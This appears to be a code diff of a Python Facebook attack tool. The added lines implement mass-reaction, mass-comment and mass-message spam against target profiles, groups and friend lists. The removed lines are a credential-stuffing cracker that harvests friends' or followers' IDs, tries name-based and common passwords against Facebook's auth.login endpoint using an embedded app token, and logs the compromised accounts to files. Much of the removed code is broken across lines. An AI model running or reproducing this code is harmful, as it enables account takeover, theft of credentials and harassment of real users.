+{c}06{ab}. {p}sad
+{c}07{ab}. {p}angry
+{c}00{ab}. {p}back
+{ab}-----------------------------------------------""")
+    return rct()
+def rct():
+    choice=input(f"{pr}Select : {c}")
+    if choice == "00" or choice == "0":
+       spam_react()
+    elif choice == "01" or choice == "1":
+       return "&reaction_type=1&"
+    elif choice == "02" or choice == "2":
+       return "&reaction_type=2&"
+    elif choice == "03" or choice == "3":
+       return "&reaction_type=16&"
+    elif choice == "04" or choice == "4":
+       return "&reaction_type=4&"
+    elif choice == "05" or choice == "5":
+       return "&reaction_type=3&"
+    elif choice == "06" or choice == "6":
+       return "&reaction_type=7&"
+    elif choice == "07" or choice == "7":
+       return "&reaction_type=8&"
+    else:
+       print(f"{er}Pilih yg bener coeg")
+       rct()
+def pilih_menu_comment():
+    choice=input(f"{pr}Select : {c}")
+    if choice == "00" or choice == "0":
+       menu()
+    elif choice == "01" or choice == "1":
+       username=input(f"{pr}Username/ID Target : {c}")
+       if username.isdigit():
+          username="/profile.php?id="+username+"&v=timeline"
+       else:
+          username="/"+username+"?v=timeline"
+       usr=komen(mbasic.format(username),"Lihat Berita Lain")
+       print()
+       pesan=input(f"{pr}Comment here : {c}")
+       try:
+          jum=input(f"{pr}Comment Count : {c}")
+          jum=int(jum)
+       except ValueError:
+          print(f"{er}Masukin jumlah post yg mau di commentnya coeg")
+          jum=input(f"{pr}Comment Count : {c}")
+          jum=int(jum)
+       try:
+          with ThreadPoolExecutor(max_workers=10) as ex:
+               for x in usr[:jum]:
+                   ex.submit(main_comment,(mbasic.format(x)),(pesan))
+          print()
+          cblg()
+       except UnboundLocalError:
+          pass
+       except Exception as e:
+          print()
+          print(f"{er}{e}")
+          cblg()
+    elif choice == "02" or choice == "2":
+       usr=komen(mbasic.format("/home.php"),"Lihat Berita Lain")
+       print()
+       pesan=input(f"{pr}Comment Here : {c}")
+       try:
+           jum=input(f"{pr}Comment Count : {c}")
+           jum=int(jum)
+       except ValueError:
+           print(f"{er}Masukin jumlah post yg mau di comment nya coeg")
+           jum=input(f"{pr}Comment Count : {c}")
+           jum=int(jum)
+       try:
+           with ThreadPoolExecutor(max_workers=10) as ex:
+                for x in usr[:jum]:
+                    ex.submit(main_comment,(mbasic.format(x)),(pesan))
+           print()
+           cblg()
+       except UnboundLocalError:
+           pass
+       except Exception as e:
+           print()
+           print(f"{er}{e}")
+           cblg()
+    elif choice == "03" or choice == "3":
+       username=input(f"{pr}Username/ID Group : {c}")
+       usr=komen(mbasic.format(username),"Lihat Postingan Lainnya")
+       print()
+       pesan=input(f"{pr}Comment Here : {c}")
+       try:
+          jum=input(f"{pr}Comment Count : {c}")
+          jum=int(jum)
+       except ValueError:
+          print(f"{er}Masukin jumlah post yg mau di commentnya coeg")
+          jum=input(f"{pr}Comment Count : {c}")
+          jum=int(jum)
+       try:
+          with ThreadPoolExecutor(max_workers=30) as ex:
+               for x in usr[:jum]:
+                   ex.submit(main_comment,(mbasic.format(x)),(pesan))
+          print()
+          cblg()
+       except UnboundLocalError:
+          pass
+       except Exception as e:
+          print()
+          print(f"{er}{e}")
+          cblg()
+    elif choice == "04" or choice == "4":
+       username=input(f"{pr}UrlPost? : {c}")
+       if "www.facebook" in username:
+          username=username.replace("www.facebook","mbasic.facebook")
+       elif "m.facebook" in username:
+          username=username.replace("m.facebook","mbasic.facebook")
+       else:
+          username=username
+       pesan=input(f"{pr}Comment Here : {c}")
+       try:
+          jum=input(f"{pr}Comment Count : {c}")
+          jum=int(jum)
+       except ValueError:
+          print(f"{er}Masukin jumlah comment nya coeg")
+          jum=input(f"{pr}Comment Count : {c}")
+          jum=int(jum)
+       try:
+          with ThreadPoolExecutor(max_workers=10) as ex:
+               for i in range(jum):
+                   ex.submit(main_comment,(username),(pesan))
+          print()
+          cblg()
+       except UnboundLocalError:
+          pass
+       except Exception as e:
+          print()
+          print(f"{er}{e}")
+          cblg()
+    else:
+       print(f"{er}Wrong input")
+       pilih_menu_comment()
+def pilih_menu_message():
+    choice=input(f"{pr}Select : {c}")
+    if choice == "00" or choice == "0":
+       menu()
+    elif choice == "01" or choice == "1":
+       usr=onteman(mbasic.format("/buddylist.php"))
+       print()
+       pesan=input(f"{pr}Message : {c}")
+       try:
+           jum=input(f"{pr}Send Count : {c}")
+           jum=int(jum)
+       except ValueError:
+           print(f"{er}Masukin jumlah pesan yg mau dikirimnya coeg")
+           jum=input(f"{pr}Send Count : {c}")
+           jum=int(jum)
+       try:
+           with ThreadPoolExecutor(max_workers=10) as ex:
+                for x in usr[:jum]:
+                    ex.submit(msg,(mbasic.format("/profile.php?id="+x)),(pesan))
+           print()
+           cblg()
+       except UnboundLocalError:
+           pass
+       except Exception as e:
+           print()
+           print(f"{er}{e}")
+           cblg()
+    elif choice == "02" or choice == "2":
+       username=input(f"{pr}Username/ID target : {c}")
+       if username.isdigit():
+          username="/profile.php?id="+username
+       else:
+          username="/"+username
+       url=mbasic.format(username)
+       pesan=input(f"{pr}Message : {c}")
+       try:
+          jum=input(f"{pr}Send Count : {c}")
+          jum=int(jum)
+       except ValueError:
+          print(f"{er}Masukin jumlah pesan yg mau dikirimnya coeg")
+          jum=input(f"{pr}Send Count : {c}")
+          jum=int(jum)
+       try:
+          with ThreadPoolExecutor(max_workers=10) as ex:
+               for _ in range(jum):
+                  ex.submit(msg,(url),(pesan))
+          print()
+          cblg()
+       except UnboundLocalError:
+          pass
+       except Exception as e:
+          print()
+          print(f"{er}{e}")
+          cblg()
+    else:
+       print(f"{er}Wrong Input")
+       pilih_menu_message()
+if __name__=="__main__":
+    baner()
+    ses=requests.Session()
+    ua=ug()
+    ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","referer":"https://mbasic.facebook.com/","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
     try:
-        token = open("vau_token.txt", "r").read()
-    except(KeyError , IOError):
-        token()
-    try:
-        r = requests.get("https://graph.facebook.com/me?
-
-access_token="+token)
-        q = json.loads(r.text)
-        name = q["name"]
-    except(KeyError):
-        logo()
-        print("")
-        print("\t\033[91;1m  LOGGED IN TOKEN HAS EXPIRED")
-        os.system("rm -rf vau_token.txt")
-        print("")
-        time.sleep(1)
-        token()
-    os.system("clear")
-    xn = name.upper()
-    logo()
-    print("")
-    print("\033[93;1m     HELLO   : \033[92;1m"+xn)
-    print("\033[93;1m     REGION  : \033[92;1m") + loc
-    print("\033[93;1m     YOUR IP : \033[92;1m") + ip
-    print("")
-
-    print("")
-    print("\033[92;1m  [1] CRACK WITH AUTO PASS")
-    print("\033[93;1m  [2] CRACK WITH MANUAL PASS")
-    print('\033[91;1m  [0] BACK')
-    print("")
-    menu_option()
-def menu_option():
-	select = raw_input("\033[92;1m  CHOOSE OPINION: ")
-	if select =="1":
-		crack1()
-	elif select =="2":
-		crack()
-	elif select =="3":
-		ex_id()
-	elif select =="0":
-		main()
-	else:
-		print("")
-		print("\t\033[91;1m     SELECT VALID OPTION")
-		print("")
-		menu_option()
-		
-#####
-
-def crack1():
-	global token
-	os.system("clear")
-	try:
-		token = open("vau_token.txt","r").read()
-	except IOError:
-		print("")
-		print("\t\033[91;1m     TOKEN NOT FOUND ")
-		time.sleep(1)
-		token()
-	os.system("clear")
-	logo()
-	print("")
-	print("\t\033[93;1m CRACK WITH AUTO PASS")
-	print("")
-	print("\033[94;1m  [1] CRACK PUBLIC ID")
-	print("\033[93;1m  [2] CRACK FOLLOWERS")
-	print("\033[92;1m  [3] CRACK FILE")
-	print("")
-	crack_select1()
-	
-def crack_select1():
-	select = raw_input("\033[92;1m  CHOOSE OPINION: ")
-	id=[]
-	oks=[]
-	cps=[]
-	if select =="1":
-		os.system("clear")
-		logo()
-		print("")
-		idt = raw_input("\033[92;1m  INPUT PUBLIC ID : ")
-		try:
-			r = requests.get
-
-("https://graph.facebook.com/"+idt+"?access_token="+token)
-			q = json.loads(r.text)
-			os.system('clear')
-			logo()
-			print('')
-			print("\t\033[93;1m  AUTO PASS CRACKING")
-			print('')
-			print("\033[92;1m  COINING FROM : "+q
-
-["name"])
-		except KeyError:
-			print("\t\033[91;1m  INVALID LINK OR TOKEN")
-			print("")
-			raw_input("\033[91;1m  PRESS ENTER TO BACK")
-			crack1()
-		r = requests.get("https://graph.facebook.com/"+idt
-
-+"/friends?access_token="+token)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid = i["id"]
-			na = i["name"]
-			id.append(uid+"|"+na)
-	elif select =="2":
-		os.system("clear")
-		logo()
-		print("")
-		idt = raw_input("\033[92;1m  INPUT FOLLOWER ID : ")
-		try:
-			r = requests.get
-
-("https://graph.facebook.com/"+idt+"?access_token="+token)
-			q = json.loads(r.text)
-			os.system('clear')
-			logo()
-			print('')
-			print("\t\033[93;1m  AUTO PASS CRACKING")
-			print('')
-			print("\033[92;1m  COINING FROM : "+q
-
-["name"])
-		except KeyError:
-			print("\t\033[91;1m     INVALID LINK OR 
-
-TOKEN")
-			print("")
-			raw_input("\033[91;1m PRESS ENTER TO BACK")
-			crack1()
-		r = requests.get("https://graph.facebook.com/"+idt
-
-+"/subscribers?access_token="+token+"&limit=999999")
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid = i["id"]
-			na = i["name"]
-			id.append(uid+"|"+na)
-	elif select =="3":
-		os.system("clear")
-		logo()
-		print("")
-		print("\t\033[93;1m   AUTO PASS CRACKING")
-		print("")
-		filelist = raw_input('\033[92;1m  INPUT FILE: ')
-		try:
-			for line in open(filelist, 'r').readlines():
-				id.append(line.strip())
-				
-		except IOError:
-			print("\t\033[91;1m  REQUESTED FILE NOT 
-
-FOUND")
-			print("")
-			raw_input("\033[93;1m PRESS ENTER TO BACK")
-			crack1()
-			
-	elif select =="0":
-	    menu()
-	else:
-		print("")
-		print("\t\033[91;1m  SELECT VALID OPTION")
-		print("")
-		crack_select1()
-	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
-	print("\033[93;1m  THE PROCESS HAS STARTED")
-	print("\033[92;1m  BRUTE HAS BEEN STARTED\x1b[0m")
-	print("")
-	linex()
-	print("")
-	def main(arg):
-		user=arg
-		uid,name=user.split("|")
-		vaugent = random.choice(agents)
-		session = requests.Session()
-		session.headers.update({'User-Agent': vaugent})
-		try:
-			pass1 = name.lower().split(' ')[0] + '12'
-			data = session.get("https://b-
-
-api.facebook.com/method/auth.login?format=json&email="+uid
-
-+"&password="+pass1+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-			q = json.loads(data)
-			if "access_token" in q and "EAAA" in q:
-				print(" \033[1;32m [EFK-OK] "+uid+" 
-
-| "+pass1+"\033[0;97m")
-				ok = open("ok.txt", "a")
-				ok.write(uid+"|"+pass1+"\n")
-				ok.close()
-				oks.append(uid+pass1)
-			else:
-				if "www.facebook.com" in q
-
-["error_msg"]:
-					print(" \033[1;97m EFK-CP] 
-
-"+uid+" | "+pass1+"\033[1;93m")
-					cp = open("cp.txt", "a")
-					cp.write(uid+"|"+pass1+"\n")
-					cp.close()
-					cps.append(uid+pass1)
-				else:
-					pass2 = name.lower().split(' 
-
-')[0] + '123'
-					data = session.get
-
-("https://b-api.facebook.com/method/auth.login?
-
-format=json&email="+uid
-
-+"&password="+pass2+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-					q = json.loads(data)
-					if "access_token" in q and 
-
-"EAAA" in q:
-						print(" \033[1;32m 
-
-[EFK-OK] "+uid+" | "+pass2+"\033[0;97m")
-						ok = open("ok.txt", 
-
-"a")
-						ok.write(uid
-
-+"|"+pass2+"\n")
-						ok.close()
-						oks.append(uid
-
-+pass2)
-					else:
-						if 
-
-"www.facebook.com" in q["error_msg"]:
-							print(" 
-
-\033[1;97m [EFK-CP] "+uid+" | "+pass2+"\033[1;93m")
-							cp = open
-
-("cp.txt", "a")
-							cp.write
-
-(uid+"|"+pass2+"\n")
-							cp.close()
-							cps.append
-
-(uid+pass2)
-						else:
-							pass3 = 
-
-name.lower().split(' ')[0] + '1234'
-							data = 
-
-session.get("https://b-api.facebook.com/method/auth.login?
-
-format=json&email="+uid
-
-+"&password="+pass3+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-							q = 
-
-json.loads(data)
-							if 
-
-"access_token" in q and "EAAA" in q:
-								
-
-print(" \033[1;32m [EFK-OK] "+uid+" | "+pass3+"\033[0;97m")
-								ok = 
-
-open("ok.txt", "a")
-								
-
-ok.write(uid+"|"+pass3+"\n")
-								
-
-ok.close()
-								
-
-oks.append(uid+pass3)
-							else:
-								if 
-
-"www.facebook.com" in q["error_msg"]:
-									
-
-print(" \033[1;97m [EFK-CP] "+uid+" | "+pass3+"\033[1;93m")
-									
-
-cp = open("cp.txt", "a")
-									
-
-cp.write(uid+"|"+pass3+"\n")
-									
-
-cp.close()
-									
-
-cps.append(uid+pass3)
-								
-
-else:
-									
-
-pass4 = name.lower().split(' ')[0] + '12345'
-									
-
-data = session.get("https://b-api.facebook.com/method/auth.login?
-
-format=json&email="+uid
-
-+"&password="+pass4+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-									
-
-q = json.loads(data)
-									
-
-if "access_token" in q and "EAAA" in q:
-									
-
-	print(" \033[1;32m [EFK-OK] "+uid+" | "+pass4+"\033[0;97m")
-									
-
-	ok = open("ok.txt", "a")
-									
-
-	ok.write(uid+"|"+pass4+"\n")
-									
-
-	ok.close()
-									
-
-	oks.append(uid+pass4)
-									
-
-else:
-									
-
-	if "www.facebook.com" in q["error_msg"]:
-									
-
-		print(" \033[1;33m [EFK-CP] "+uid+" | "+pass4+"\033
-
-[0;97m")
-									
-
-		cp = open("cp.txt", "a")
-									
-
-		cp.write(uid+"|"+pass4+"\n")
-									
-
-		cp.close()
-									
-
-		cps.append(uid+pass4)
-									
-
-	else:
-									
-
-		pass5 = name.lower().split(' ')[0] + name.lower
-
-().split(' ')[1]
-									
-
-		data = session.get("https://b-
-
-api.facebook.com/method/auth.login?format=json&email="+uid
-
-+"&password="+pass5+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-									
-
-		q = json.loads(data)
-									
-
-		if "access_token" in q and "EAAA" in q:
-									
-
-			print(" \033[1;32m [EFK-OK] "+uid+" | 
-
-"+pass5+"\033[0;97m")
-									
-
-			ok = open("ok.txt", "a")
-									
-
-			ok.write(uid+"|"+pass5+"\n")
-									
-
-			ok.close()
-									
-
-			oks.append(uid+pass5)
-									
-
-		else:
-									
-
-			if "www.facebook.com" in q["error_msg"]:
-									
-
-				print(" \033[1;97m [EFK--CP] "+uid+" 
-
-| "+pass5+"\033[1;93m")
-									
-
-				cp = open("cp.txt", "a")
-									
-
-				cp.write(uid+"|"+pass5+"\n")
-									
-
-				cp.close()
-									
-
-				cps.append(uid+pass5)
-									
-
-			else:
-									
-
-				pass6 = name.lower()
-									
-
-				data = session.get("https://b-
-
-api.facebook.com/method/auth.login?format=json&email="+uid
-
-+"&password="+pass6+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-									
-
-				q = json.loads(data)
-									
-
-				if "access_token" in q and "EAAA" in 
-
-q:
-									
-
-					print(" \033[1;32m [EFK-OK] 
-
-"+uid+" | "+pass6+"\033[0;97m")
-									
-
-					ok = open("ok.txt", "a")
-									
-
-					ok.write(uid+"|"+pass6+"\n")
-									
-
-					ok.close()
-									
-
-					oks.append(uid+pass6)
-									
-
-				else:
-									
-
-					if "www.facebook.com" in q
-
-["error_msg"]:
-									
-
-						print(" \033[1;33m 
-
-[EFK--CP] "+uid+" | "+pass6+"\033[0;97m")
-									
-
-						cp = open("cp.txt", 
-
-"a")
-									
-
-						cp.write(uid
-
-+"|"+pass6+"\n")
-									
-
-						cp.close()
-									
-
-						cps.append(uid
-
-+pass6)
-									
-
-					else:
-									
-
-						pass7 = "223344"
-									
-
-						data = session.get
-
-("https://b-api.facebook.com/method/auth.login?
-
-format=json&email="+uid
-
-+"&password="+pass7+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-									
-
-						q = json.loads(data)
-									
-
-						if "access_token" in 
-
-q and "EAAA" in q:
-									
-
-							print(" 
-
-\033[1;32m [EFK-OK] "+uid+" | "+pass7+"\033[0;97m")
-									
-
-							ok = open
-
-("ok.txt", "a")
-									
-
-							ok.write
-
-(uid+"|"+pass7+"\n")
-									
-
-							ok.close()
-									
-
-							oks.append
-
-(uid+pass7)
-									
-
-						else:
-									
-
-							if 
-
-"www.facebook.com" in q["error_msg"]:
-									
-
-								
-
-print(" \033[1;33m [EFK-CP] "+uid+" | "+pass7+"\033[0;97m")
-									
-
-								cp = 
-
-open("cp.txt", "a")
-									
-
-								
-
-cp.write(uid+"|"+pass7+"\n")
-									
-
-								
-
-cp.close()
-									
-
-								
-
-cps.append(uid+pass7)
-									
-
-							else:
-									
-
-								
-
-pass8 = name.lower().split(' ')[1] + '123'
-									
-
-								data 
-
-= session.get("https://b-api.facebook.com/method/auth.login?
-
-format=json&email="+uid
-
-+"&password="+pass8+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-									
-
-								q = 
-
-json.loads(data)
-									
-
-								if 
-
-"access_token" in q and "EAAA" in q:
-									
-
-									
-
-print(" \033[1;32m [EFK-OK] "+uid+" | "+pass8+"\033[0;97m")
-									
-
-									
-
-ok = open("ok.txt", "a")
-									
-
-									
-
-ok.write(uid+"|"+pass8+"\n")
-									
-
-									
-
-ok.close()
-									
-
-									
-
-oks.append(uid+pass8)
-									
-
-								
-
-else:
-									
-
-									
-
-if "www.facebook.com" in q["error_msg"]:
-									
-
-									
-
-	print(" \033[1;97m [EFK-CP] "+uid+" | "+pass8+"\033[1;93m")
-									
-
-									
-
-	cp = open("cp.txt", "a")
-									
-
-									
-
-	cp.write(uid+"|"+pass8+"\n")
-									
-
-									
-
-	cp.close()
-									
-
-									
-
-	cps.append(uid+pass8)
-									
-
-			
-									
-
-	
-									
-
-	
-		except:
-			pass
-	p = ThreadPool(30)
-	p.map(main, id)
-	print("")
-	linex()
-	print("")
-	print("\033[92;1m THE PROCESS HAS BEEN COMPLETED")
-	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: 
-
-"+str(len(oks))+"/"+str(len(cps)))
-	print("")
-	linex()
-	print("")
-	raw_input("\033[93;1m PRESS ENTER TO BACK ")
-	menu()
-	
-######
-
-def crack():
-	global token
-	os.system("clear")
-	try:
-		token = open("vau_token.txt","r").read()
-	except IOError:
-		print("")
-		print("\t\033[91;1m  TOKEN NOT FOUND ")
-		time.sleep(1)
-		token()
-	os.system("clear")
-	logo()
-	print("")
-	print("\t\033[93;1m  MANUAL PASS CRACKING")
-	print("")
-	print("\033[94;1m  [1] CRACK PUBLIC ID")
-	print("\033[93;1m  [2] CRACK FOLLOWERS")
-	print("\033[92;1m  [3] CRACK FILE")
-	print("")
-	crack_select()
-
-def crack_select():
-	select = raw_input("\033[92;1m  CHOOSE OPINION: ")
-	id=[]
-	oks=[]
-	cps=[]
-	if select =="1":
-		os.system("clear")
-		logo()
-		print("")
-		print("\t\033[93;1m  MANUAL PASS CRACKING")
-		print("")
-		print("\033[93;1m  EXAMPLE :\033[96;1m 12, 1122, 
-
-321, 1234, 786 ETC")
-		print("")
-		idt = raw_input("\n\033[92;1m  INPUT PUBLIC ID : ")
-		print("")
-		p1 = raw_input("\033[92;1m  NAME + DIGIT PASSWORD 1: 
-
-")
-		p2 = raw_input("\033[93;1m  NAME + DIGIT PASSWORD 2: 
-
-")
-		p3 = raw_input("\033[94;1m  NAME + DIGIT PASSWORD 3: 
-
-")
-		p4 = raw_input("\033[95;1m  NAME + DIGIT PASSWORD 4: 
-
-")
-		print("")
-		print("\033[93;1m  EXAMPLE :\033[96;1m 102030, 
-
-223344, 556677, 786786 ETC ")
-		print("")
-		pass5 = raw_input("\033[92;1m  PASSWORD 5: ")
-		pass6 = raw_input("\033[93;1m  PASSWORD 6: ")
-		pass7 = raw_input("\033[94;1m  PASSWORD 7: ")
-		try:
-			r = requests.get
-
-("https://graph.facebook.com/"+idt+"?access_token="+token)
-			q = json.loads(r.text)
-			os.system('clear')
-			logo()
-			print('')
-			print("\t\033[93;1m  MANUAL PASS CRACKING")
-			print('')
-			print("\033[92;1m  COINING FROM : "+q
-
-["name"])
-		except KeyError:
-			print("\t\033[91;1m  INVALID LINK OR TOKEN")
-			print("")
-			raw_input(" PRESS ENTER TO BACK")
-			crack()
-		r = requests.get("https://graph.facebook.com/"+idt
-
-+"/friends?access_token="+token)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid = i["id"]
-			na = i["name"]
-			id.append(uid+"|"+na)
-	elif select =="2":
-		os.system("clear")
-		logo()
-		print("")
-		print("\t\033[93;1m  MANUAL PASS CRACKING")
-		print("")
-		print("\033[93;1m  EXAMPLE :\033[96;1m 12, 1122, 
-
-321, 1234, 786 ETC")
-		print("")
-		idt = raw_input("\n\033[92;1m  INPUT PUBLIC FOLLOWER 
-
-ID : ")
-		print("")
-		p1 = raw_input("\033[92;1m  NAME + DIGIT PASSWORD 1: 
-
-")
-		p2 = raw_input("\033[93;1m  NAME + DIGIT PASSWORD 2: 
-
-")
-		p3 = raw_input("\033[94;1m  NAME + DIGIT PASSWORD 3: 
-
-")
-		p4 = raw_input("\033[95;1m  NAME + DIGIT PASSWORD 4: 
-
-")
-		print("")
-		print("\033[93;1m  EXAMPLE :\033[96;1m 102030, 
-
-223344, 556677, 786786 ETC ")
-		print("")
-		pass5 = raw_input("\033[92;1m  PASSWORD 5: ")
-		pass6 = raw_input("\033[93;1m  PASSWORD 6: ")
-		pass7 = raw_input("\033[94;1m  PASSWORD 7: ")
-		try:
-			r = requests.get
-
-("https://graph.facebook.com/"+idt+"?access_token="+token)
-			q = json.loads(r.text)
-			os.system('clear')
-			logo()
-			print('')
-			print("\t\033[93;1m  MANUAL PASS CRACKING")
-			print('')
-			print("\033[92;1m  COINING FROM : "+q
-
-["name"])
-		except KeyError:
-			print("\t\033[91;1m     INVALID LINK OR 
-
-TOKEN")
-			print("")
-			raw_input("\033[91;1m PRESS ENTER TO BACK")
-			crack()
-		r = requests.get("https://graph.facebook.com/"+idt
-
-+"/subscribers?access_token="+token+"&limit=999999")
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid = i["id"]
-			na = i["name"]
-			id.append(uid+"|"+na)
-	elif select =="3":
-		os.system("clear")
-		logo()
-		print("")
-		print("\t\033[93;1m  MANUAL PASS CRACKING")
-		print("")
-		print("")
-                filelist = raw_input('\033[92;1m  INPUT FILE: ')
-		try:
-			for line in open(filelist, 'r').readlines():
-				id.append(line.strip())
-		except IOError:
-			print("\t\033[91;1m  REQUESTED FILE NOT 
-
-FOUND")
-			print("")
-			raw_input("\033[93;1m PRESS ENTER TO BACK")
-			crack()
-		print("\033[93;1m  EXAMPLE :\033[96;1m 12, 1122, 
-
-321, 1234, 786 ETC")
-		print("")
-		p1 = raw_input("\033[92;1m  NAME + DIGIT PASSWORD 1: 
-
-")
-		p2 = raw_input("\033[93;1m  NAME + DIGIT PASSWORD 2: 
-
-")
-		p3 = raw_input("\033[94;1m  NAME + DIGIT PASSWORD 3: 
-
-")
-		p4 = raw_input("\033[95;1m  NAME + DIGIT PASSWORD 4: 
-
-")
-		print("")
-		print("\033[93;1m  EXAMPLE :\033[96;1m 102030, 
-
-223344, 556677, 786786 ETC ")
-		print("")
-		pass5 = raw_input("\033[92;1m  PASSWORD 5: ")
-		pass6 = raw_input("\033[93;1m  PASSWORD 6: ")
-		pass7 = raw_input("\033[94;1m  PASSWORD 7: ")
-		
-	elif select =="0":
-	    menu()
-	else:
-		print("")
-		print("\t\033[91;1m  SELECT VALID OPTION")
-		print("")
-		crack_select()
-	print("")
-	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
-	print("\033[93;1m  THE PROCESS HAS STARTED")
-	print("\033[92;1m  BRUTE HAS BEEN STARTED\x1b[0m")
-	print("")
-	linex()
-	print("")
-	def main(arg):
-		user=arg
-		uid,name=user.split("|")
-		vaugent = random.choice(agents)
-		session = requests.Session()
-		session.headers.update({'User-Agent': vaugent})
-		try:
-			pass1 = name.lower().split(' ')[0]+p1
-			data = session.get("https://b-
-
-api.facebook.com/method/auth.login?format=json&email="+uid
-
-+"&password="+pass1+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-			q = json.loads(data)
-			if "access_token" in q and "EAAA" in q:
-				print(" \033[1;32m [EFK-OK] "+uid+" 
-
-| "+pass1+"\033[0;97m")
-				ok = open("ok.txt", "a")
-				ok.write(uid+"|"+pass1+"\n")
-				ok.close()
-				oks.append(uid+pass1)
-			else:
-				if "www.facebook.com" in q
-
-["error_msg"]:
-					print(" \033[1;97m [EFK-CP] 
-
-"+uid+" | "+pass1+"\033[1;93m")
-					cp = open("cp.txt", "a")
-					cp.write(uid+"|"+pass1+"\n")
-					cp.close()
-					cps.append(uid+pass1)
-				else:
-					pass2 = name.lower().split(' 
-
-')[0]+p2
-					data = session.get
-
-("https://b-api.facebook.com/method/auth.login?
-
-format=json&email="+uid
-
-+"&password="+pass2+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-					q = json.loads(data)
-					if "access_token" in q and 
-
-"EAAA" in q:
-						print(" \033[1;32m 
-
-[EFK-OK] "+uid+" | "+pass2+"\033[0;97m")
